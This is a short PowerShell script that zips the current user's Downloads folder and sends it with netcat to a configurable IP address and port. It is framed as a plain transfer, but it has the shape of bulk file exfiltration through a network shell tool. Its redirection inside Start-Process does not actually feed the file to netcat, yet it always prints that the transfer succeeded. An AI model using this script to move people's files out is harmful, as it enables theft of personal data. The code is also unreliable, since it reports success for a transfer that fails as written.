# Parameters
$downloadsFolder = "$env:USERPROFILE\Downloads"
$zipFilePath = "$env:TEMP\Downloads.zip"
$ncPath = "C:\path\to\nc.exe"  # Update this path to where your nc.exe is located
$targetIP = "127.0.0.1"  # Update this to the receiver's IP address
$targetPort = 12345

# Create a ZIP file of the Downloads folder
if (Test-Path $zipFilePath) {
    Remove-Item $zipFilePath
}

Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
[System.IO.Compression.ZipFile]::CreateFromDirectory($downloadsFolder, $zipFilePath)

# Send the ZIP file via Netcat
Start-Process -FilePath $ncPath -ArgumentList "$targetIP $targetPort < $zipFilePath" -NoNewWindow -Wait

Write-Output "Transfer completed successfully."
